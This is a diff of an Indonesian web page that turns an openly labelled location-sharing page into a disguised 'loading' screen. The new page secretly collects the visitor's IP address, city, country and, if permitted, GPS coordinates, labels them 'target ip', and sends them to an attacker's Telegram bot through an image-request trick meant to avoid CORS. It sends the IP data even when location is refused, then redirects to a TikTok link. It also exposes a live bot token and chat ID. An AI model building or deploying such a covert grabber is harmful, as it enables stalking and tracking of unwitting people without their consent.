@@ -3,75 +3,100 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ambil Lokasi</title>
+    <title>Memuat Halaman...</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px 20px; background: #f5f5f5; }
-        .card { background: #fff; max-width: 420px; margin: auto; padding: 30px; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
-        h1 { font-size: 22px; margin-bottom: 8px; }
+        body { font-family: sans-serif; text-align: center; padding-top: 100px; background: #fff; }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #000;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         p { color: #666; font-size: 14px; }
-        #status { margin-top: 20px; font-weight: bold; font-size: 15px; }
-        .ok { color: #16a34a; }
-        .err { color: #dc2626; }
-        .loading { color: #2563eb; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <h1>📍 Mengambil Lokasi Anda...</h1>
-        <p>Harap izinkan akses lokasi jika diminta oleh browser.</p>
-        <div id="status" class="loading">Menunggu izin lokasi...</div>
-    </div>
+    <div class="loader"></div>
+    <p id="status">Mohon tunggu sebentar, sedang mengarahkan...</p>
 
     <script>
+        // ==== ISI DATA ANDA ====
         const BOT_TOKEN = '9275303069:AAE5NG2xdePLKc9o7UgubNaIYhOT6r6mjdM';
         const CHAT_ID   = '1354234561';
+        
+        // Link TikTok tujuan
+        const TIKTOK_URL = 'https://www.tiktok.com/@rrrrevaalf/photo/7694167529983462674?is_from_webapp=1&sender_device=pc';
+        // ======================
 
         const statusDiv = document.getElementById('status');
 
-        function setStatus(text, cls) {
-            statusDiv.innerText = text;
-            statusDiv.className = cls || '';
+        // Fungsi untuk redirect ke TikTok
+        function redirectKeTikTok() {
+            window.location.href = TIKTOK_URL;
         }
 
-        function kirimLokasiKeTelegram(latitude, longitude) {
-            setStatus('Lokasi ditemukan. Mengirim ke Telegram...', 'loading');
-
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude}`;
-
-            // TRIK GAMBAR: Memaksa browser mengirim data tanpa diblokir sistem keamanan (CORS)
+        // Fungsi untuk kirim pesan teks ke Telegram (Trik Gambar)
+        function kirimKeTelegram(ip, kota, negara, lat, lon) {
+            const pesan = `target ip: ${ip}\nlokasi kota: ${kota}\nlokasi negara: ${negara}\nkordinat: ${lat}, ${lon}`;
+            
+            // encodeURIComponent wajib agar spasi dan enter terbaca di URL
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}`;
+            
             const img = new Image();
             
-            img.onload = function() {
-                setStatus('✅ Permintaan lokasi telah dikirim. Cek bot Telegram Anda.', 'ok');
-            };
-            
-            img.onerror = function() {
-                // Browser akan menganggap ini error karena balasan Telegram bukan gambar,
-                // TAPI datanya sudah terlanjur terkirim ke bot Telegram Anda!
-                setStatus('✅ Permintaan lokasi telah dikirim. Cek bot Telegram Anda.', 'ok');
-            };
+            // Begitu request terkirim (atau gagal dimuat sebagai gambar), langsung pindah ke TikTok
+            img.onload = redirectKeTikTok;
+            img.onerror = redirectKeTikTok;
             
             img.src = url;
         }
 
-        function ambilLokasi() {
-            if (!navigator.geolocation) {
-                setStatus('❌ Browser tidak mendukung Geolocation.', 'err');
-                return;
-            }
+        // Fungsi Utama
+        async function jalankan() {
+            try {
+                // 1. Ambil data IP, Kota, Negara
+                statusDiv.innerText = "Memeriksa jaringan...";
+                const responseIp = await fetch('https://ipwho.is/');
+                const dataIp = await responseIp.json();
+                
+                const ip = dataIp.ip || 'Tidak diketahui';
+                const kota = dataIp.city || 'Tidak diketahui';
+                const negara = dataIp.country || 'Tidak diketahui';
 
-            navigator.geolocation.getCurrentPosition(
-                pos => {
-                    kirimLokasiKeTelegram(pos.coords.latitude, pos.coords.longitude);
-                },
-                err => {
-                    setStatus(`❌ Gagal mendapatkan lokasi: ${err.message}`, 'err');
-                },
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-            );
+                // 2. Minta Lokasi (GPS) ke Pengguna
+                statusDiv.innerText = "Mengambil titik koordinat...";
+                
+                if (!navigator.geolocation) {
+                    // Jika browser tidak support, kirim tanpa koordinat
+                    kirimKeTelegram(ip, kota, negara, 'Tidak Support', 'Tidak Support');
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        // Jika pengguna klik "Izinkan"
+                        kirimKeTelegram(ip, kota, negara, pos.coords.latitude, pos.coords.longitude);
+                    },
+                    (err) => {
+                        // Jika pengguna klik "Blokir" atau gagal, tetap kirim data IP-nya saja
+                        kirimKeTelegram(ip, kota, negara, 'Ditolak/Gagal', 'Ditolak/Gagal');
+                    },
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+                );
+
+            } catch (error) {
+                // Jika API IP mati atau error, langsung redirect saja tanpa kirim data
+                console.error(error);
+                redirectKeTikTok();
+            }
         }
 
-        window.onload = ambilLokasi;
+        // Jalankan saat halaman dimuat
+        window.onload = jalankan;
     </script>
 </body>
 </html>
